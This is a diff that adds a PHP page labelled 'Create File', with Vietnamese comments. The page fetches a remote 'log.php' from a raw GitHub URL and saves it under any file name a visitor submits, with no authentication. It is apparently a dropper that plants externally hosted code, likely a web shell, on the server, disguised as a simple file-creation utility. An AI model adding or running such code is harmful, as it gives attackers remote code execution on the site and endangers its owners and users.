@@ -1,0 +1,42 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['filename'])) {
+    $filename = trim($_POST['filename']);
+    $url = "https://raw.githubusercontent.com/DitMeCongSan1/ak/refs/heads/main/log.php";
+
+    // Kiểm tra tên file hợp lệ
+    if (empty($filename) || preg_match('/[\/:*?"<>|]/', $filename)) {
+        echo "Tên file không hợp lệ.";
+        exit;
+    }
+
+    // Lấy nội dung từ URL
+    $content = file_get_contents($url);
+    if ($content === false) {
+        echo "Không thể tải nội dung từ URL.";
+        exit;
+    }
+
+    // Tạo file
+    if (file_put_contents($filename, $content)) {
+        echo "File '$filename' đã được tạo thành công.";
+    } else {
+        echo "Không thể tạo file '$filename'.";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create File</title>
+</head>
+<body>
+    <form method="post">
+        <label for="filename">Nhập tên file:</label>
+        <input type="text" id="filename" name="filename" required>
+        <button type="submit">Create</button>
+    </form>
+</body>
+</html>
